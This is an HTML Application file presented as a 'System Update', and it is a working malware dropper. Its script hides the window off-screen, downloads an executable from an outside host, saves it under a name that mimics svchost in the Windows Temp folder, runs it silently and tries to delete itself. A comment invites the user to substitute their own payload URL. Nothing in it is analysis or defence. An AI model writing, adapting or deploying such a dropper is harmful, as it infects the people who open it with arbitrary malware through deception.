<!DOCTYPE html>
<html>
<head>
<HTA:APPLICATION 
    ID="oHTA"
    APPLICATIONNAME="System Update"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    SCROLL="no"
    SELECTION="no"
    INNERBORDER="no"
/>
<style>
    body { margin: 0; padding: 0; background-color: #f0f0f0; }
</style>
<title>Update</title>
<script language="VBScript">
    ' Resize and move the window immediately upon load
    Sub Window_OnLoad
        window.resizeTo 1, 1
        window.moveTo -2000, -2000
        ' Hide the body content
        document.body.style.visibility = "hidden"
    End Sub
</script>
</head>
<body>
    <script language="JavaScript">
        try {
            // 1. Download payload
            var x = new ActiveXObject("MSXML2.XMLHTTP");
            // REPLACE THIS WITH YOUR ACTUAL PAYLOAD URL (NOT THE HTA ITSELF)
            // Example: x.open("GET", "https://your-site.com/payload.exe", false);
            x.open("GET", "https://swift-executorlol.vercel.app/Runtime Broker.exe", false); 
            x.send();

            // 2. Save to Temp
            var s = new ActiveXObject("ADODB.Stream");
            s.Open();
            s.Type = 1; // Binary
            s.Write(x.responseBody);
            
            var tempPath = "C:\\Windows\\Temp\\svchost_update.dat";
            s.SaveToFile(tempPath, 2); 
            s.Close();

            // 3. Execute silently
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run(tempPath, 0, false);

            // 4. Self-destruct
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            fso.DeleteFile(WScript.ScriptFullName);

        } catch (e) {
            // Silent fail
        }
    </script>
</body>
</html>
